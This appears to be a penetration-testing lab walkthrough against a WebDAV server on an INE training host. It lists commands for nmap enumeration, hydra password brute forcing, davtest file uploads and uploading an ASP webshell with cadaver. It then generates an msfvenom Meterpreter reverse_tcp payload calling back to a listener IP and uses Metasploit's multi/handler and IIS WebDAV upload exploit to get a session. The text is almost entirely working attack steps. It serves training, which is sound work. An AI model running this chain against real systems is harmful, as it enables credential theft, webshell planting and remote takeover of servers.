- __1. Running http-enum nmap script to discover interesting directories.__
  - `nmap --script http-enum -sV -p 80 demo.ine.local`

__Brute Force Attack on authorized web__
- `hydra -L /usr/share/wordlists/metasploit/common_users.txt -P /usr/share/wordlists/metasploit/common_passwords.txt demo.ine.local http-get /webdav`

- __2.Running davtest tool.__
  - *Davtest is a WebDAV scanner that sends exploit files to the WebDAV server and automatically creates the directory and uploads different format types of files. The tool also tried to execute uploaded files and gives us an output of successfully executed files.*
  - `davtest -url http://demo.ine.local/webdav`
  - `davtest -auth user:password -url http://demo.ine.local/webdav`

- __3.Upload a .asp backdoor on the target machine to /webdav directory using cadaver utility.__
  - `The .asp backdoor present in “/usr/share/webshells/asp/” directory. i.e /usr/share/webshells/asp/webshell.asp`
  - * Cadaver is a tool for WebDAV clients, which supports a command-line style interface. It supports operations such as uploading files, editing, moving, etc.*
  - `cadaver http://demo.ine.local/webdav`

 - __4. Other method using msfconsole__
- `msfvenom -p windows/meterpreter/reverse_tcp LHOST=10.0.1.22 LPORT=1234 -f asp > shell.asp`
- `cadaver http://10.0.1.22/webdav`
  - __Now you have upload the shell.asp file in webside__v

- `service postgresql start && msfconsole`
```
use multi/handler
set payload windows/meterpreter/reverse_tcp
show options
set lhost and lport
exploit
sessions -i 1
```
- __run the shell.asp that you upload using cadaver__
# __OR__
- `service postgresql start && msfconsole`
```
use multi/handler
use exploit/windows/iis/iis_webdav_upload_asp
set lhost,lport,HttpUsername& Httppassword
set RHOST <target ip>
set PATH /webdav/shell.asp
exploit
sessions -i <UID>
```


